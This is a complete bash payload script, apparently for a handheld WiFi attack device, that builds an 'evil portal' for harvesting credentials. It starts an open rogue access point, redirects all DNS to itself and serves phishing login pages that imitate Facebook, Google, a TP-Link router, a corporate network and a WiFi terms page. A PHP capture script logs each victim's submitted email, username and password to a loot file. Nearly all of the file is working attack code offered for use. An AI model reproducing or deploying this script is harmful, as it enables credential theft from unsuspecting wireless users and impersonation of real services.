#!/bin/bash
# Title: NullSec Evil Portal
# Author: bad-antics
# Description: Custom NullSec branded captive portal for credential capture
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{portal,creds}
CRED_LOG="$LOOT_DIR/creds/portal_$(date +%Y%m%d).txt"

PROMPT "NULLSEC EVIL PORTAL

Custom captive portal with
NullSec branding for cred
harvesting.

Templates:
- Corporate Login
- WiFi Terms & Conditions
- Social Media Login
- Router Admin

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

# Select template
PROMPT "SELECT TEMPLATE:

1. Corporate/Enterprise
2. Terms & Conditions
3. Facebook Login
4. Google Login
5. Router Admin Page

Enter number next screen."

TEMPLATE=$(NUMBER_PICKER "Template (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TEMPLATE=1 ;; esac

# SSID based on template
case $TEMPLATE in
    1) DEFAULT_SSID="Corporate_Guest" ;;
    2) DEFAULT_SSID="Free WiFi" ;;
    3) DEFAULT_SSID="Facebook WiFi" ;;
    4) DEFAULT_SSID="Google Guest" ;;
    5) DEFAULT_SSID="TP-Link_Setup" ;;
esac

SSID=$(TEXT_PICKER "AP SSID:" "$DEFAULT_SSID")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="$DEFAULT_SSID" ;; esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 600)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=600 ;; esac

resp=$(CONFIRMATION_DIALOG "Launch Evil Portal?

SSID: $SSID
Template: $TEMPLATE
Duration: ${DURATION}s

Creds saved to:
$CRED_LOG")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Kill existing services
killall hostapd dnsmasq php php-cgi lighttpd 2>/dev/null

# Create portal directory
PORTAL_DIR="/tmp/nullsec_portal"
mkdir -p "$PORTAL_DIR"

# Generate HTML based on template
case $TEMPLATE in
    1) # Corporate
cat > "$PORTAL_DIR/index.html" << 'CORPHTML'
<!DOCTYPE html>
<html>
<head>
<title>Corporate Network Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Arial; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.container { background: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
.logo { text-align: center; margin-bottom: 30px; }
.logo h1 { color: #c41e3a; font-size: 28px; }
.logo p { color: #666; font-size: 12px; }
h2 { color: #333; margin-bottom: 20px; text-align: center; }
input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
button { width: 100%; padding: 15px; background: #c41e3a; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
button:hover { background: #a01830; }
.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #999; }
</style>
</head>
<body>
<div class="container">
<div class="logo">
<h1>⬡ NULLSEC</h1>
<p>ENTERPRISE SECURITY</p>
</div>
<h2>Network Authentication</h2>
<form method="POST" action="/capture.php">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="template" value="corporate">
<button type="submit">Sign In</button>
</form>
<div class="footer">
Authorized users only. All access is logged and monitored.
</div>
</div>
</body>
</html>
CORPHTML
       ;;
    2) # Terms
cat > "$PORTAL_DIR/index.html" << 'TERMSHTML'
<!DOCTYPE html>
<html>
<head>
<title>WiFi Terms of Service</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial; background: #f5f5f5; padding: 20px; }
.container { background: #fff; max-width: 500px; margin: 0 auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
h1 { color: #c41e3a; text-align: center; }
h2 { color: #333; margin: 20px 0 10px; }
.terms { background: #f9f9f9; padding: 15px; border-radius: 5px; height: 150px; overflow-y: scroll; font-size: 12px; margin: 15px 0; }
input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
button { width: 100%; padding: 15px; background: #c41e3a; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
label { font-size: 14px; }
</style>
</head>
<body>
<div class="container">
<h1>⬡ Free WiFi</h1>
<h2>Terms of Service</h2>
<div class="terms">
By using this network, you agree to our terms of service. This network is provided as-is without warranty. Usage is monitored and logged for security purposes. Do not use this network for illegal activities. We reserve the right to disconnect users at any time. Data transmitted over this network may be intercepted. Use at your own risk.
</div>
<form method="POST" action="/capture.php">
<input type="email" name="email" placeholder="Email Address" required>
<input type="text" name="name" placeholder="Full Name">
<input type="hidden" name="template" value="terms">
<label><input type="checkbox" required> I agree to the Terms of Service</label><br><br>
<button type="submit">Connect to WiFi</button>
</form>
</div>
</body>
</html>
TERMSHTML
       ;;
    3) # Facebook
cat > "$PORTAL_DIR/index.html" << 'FBHTML'
<!DOCTYPE html>
<html>
<head>
<title>Log in to Facebook</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Helvetica, Arial; background: #f0f2f5; margin: 0; padding: 20px; }
.container { max-width: 400px; margin: 50px auto; }
.logo { text-align: center; margin-bottom: 20px; }
.logo h1 { color: #1877f2; font-size: 48px; font-weight: bold; }
.box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
.btn-login { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
.divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
.btn-create { display: block; width: 50%; margin: 0 auto; padding: 12px; background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; text-align: center; }
a { color: #1877f2; text-decoration: none; display: block; text-align: center; margin: 15px 0; }
</style>
</head>
<body>
<div class="container">
<div class="logo"><h1>facebook</h1></div>
<div class="box">
<form method="POST" action="/capture.php">
<input type="text" name="email" placeholder="Email address or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="template" value="facebook">
<button type="submit" class="btn-login">Log In</button>
</form>
<a href="#">Forgotten password?</a>
<div class="divider"></div>
<button class="btn-create">Create New Account</button>
</div>
</div>
</body>
</html>
FBHTML
       ;;
    4) # Google
cat > "$PORTAL_DIR/index.html" << 'GHTML'
<!DOCTYPE html>
<html>
<head>
<title>Sign in - Google Accounts</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: 'Google Sans', Roboto, Arial; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
.container { width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; }
.logo { text-align: center; margin-bottom: 16px; }
.logo span { font-size: 24px; margin: 0 2px; }
.logo .g { color: #4285f4; } .logo .o1 { color: #ea4335; } .logo .o2 { color: #fbbc05; } .logo .g2 { color: #4285f4; } .logo .l { color: #34a853; } .logo .e { color: #ea4335; }
h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 16px 0 8px; }
p { color: #5f6368; text-align: center; font-size: 16px; margin-bottom: 32px; }
input { width: 100%; padding: 13px 15px; margin: 12px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
input:focus { border: 2px solid #1a73e8; outline: none; }
.forgot { color: #1a73e8; font-size: 14px; text-decoration: none; }
.buttons { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
.create { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
.next { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
</style>
</head>
<body>
<div class="container">
<div class="logo">
<span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
</div>
<h1>Sign in</h1>
<p>to continue to WiFi</p>
<form method="POST" action="/capture.php">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<input type="hidden" name="template" value="google">
<a href="#" class="forgot">Forgot email?</a>
<div class="buttons">
<a href="#" class="create">Create account</a>
<button type="submit" class="next">Next</button>
</div>
</form>
</div>
</body>
</html>
GHTML
       ;;
    5) # Router
cat > "$PORTAL_DIR/index.html" << 'ROUTERHTML'
<!DOCTYPE html>
<html>
<head>
<title>Router Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial; background: #e8e8e8; margin: 0; padding: 20px; }
.header { background: #4a8bc2; color: white; padding: 10px 20px; }
.container { max-width: 600px; margin: 20px auto; background: #fff; border: 1px solid #ccc; }
.content { padding: 20px; }
h2 { color: #4a8bc2; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
table { width: 100%; }
td { padding: 8px; }
input { padding: 8px; width: 200px; border: 1px solid #ccc; }
.btn { background: #4a8bc2; color: white; border: none; padding: 8px 20px; cursor: pointer; }
.warning { background: #fff3cd; border: 1px solid #ffc107; padding: 10px; margin-bottom: 15px; font-size: 13px; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<b>TP-LINK</b> Wireless N Router
</div>
<div class="content">
<div class="warning">
⚠️ Firmware update available. Please login to update.
</div>
<h2>Administrator Login</h2>
<form method="POST" action="/capture.php">
<table>
<tr><td>Username:</td><td><input type="text" name="username" value="admin"></td></tr>
<tr><td>Password:</td><td><input type="password" name="password" placeholder="Enter password"></td></tr>
<tr><td></td><td><button type="submit" class="btn">Login</button></td></tr>
</table>
<input type="hidden" name="template" value="router">
</form>
</div>
</div>
</body>
</html>
ROUTERHTML
       ;;
esac

# Capture script
cat > "$PORTAL_DIR/capture.php" << 'CAPTUREPHP'
<?php
$log_file = "/mmc/nullsec/creds/portal_" . date("Ymd") . ".txt";
$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$data = "";

foreach ($_POST as $key => $value) {
    $data .= "$key=$value | ";
}

$entry = "[$timestamp] IP:$ip | $data\n";
file_put_contents($log_file, $entry, FILE_APPEND);

// Redirect to success or real site
header("Location: /success.html");
exit;
?>
CAPTUREPHP

# Success page
cat > "$PORTAL_DIR/success.html" << 'SUCCESSHTML'
<!DOCTYPE html>
<html>
<head><title>Connected</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#f5f5f5;}h1{color:#4caf50;}.check{font-size:80px;color:#4caf50;}</style>
</head>
<body>
<div class="check">✓</div>
<h1>Connected Successfully!</h1>
<p>You now have internet access.</p>
<p>Redirecting...</p>
<script>setTimeout(function(){window.location.href='http://www.msftconnecttest.com/redirect';},3000);</script>
</body>
</html>
SUCCESSHTML

# Start services
LOG "Starting Evil Portal..."

# Hostapd
cat > /tmp/portal_hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

hostapd /tmp/portal_hostapd.conf &
sleep 2
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

# DNSMasq
cat > /tmp/portal_dnsmasq.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,5m
address=/#/10.0.0.1
EOF

dnsmasq -C /tmp/portal_dnsmasq.conf &

# PHP server
cd "$PORTAL_DIR"
if command -v php >/dev/null 2>&1; then
    php -S 10.0.0.1:80 &
else
    # Fallback to python (won't process PHP but shows page)
    python3 -m http.server 80 2>/dev/null &
fi

LOG "Portal active: $SSID"

# Run for duration
sleep $DURATION

# Cleanup
killall hostapd dnsmasq php python3 2>/dev/null

# Count creds
CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "EVIL PORTAL COMPLETE

SSID: $SSID
Duration: ${DURATION}s
Credentials: $CRED_COUNT

Log file:
$CRED_LOG

Press OK to exit."
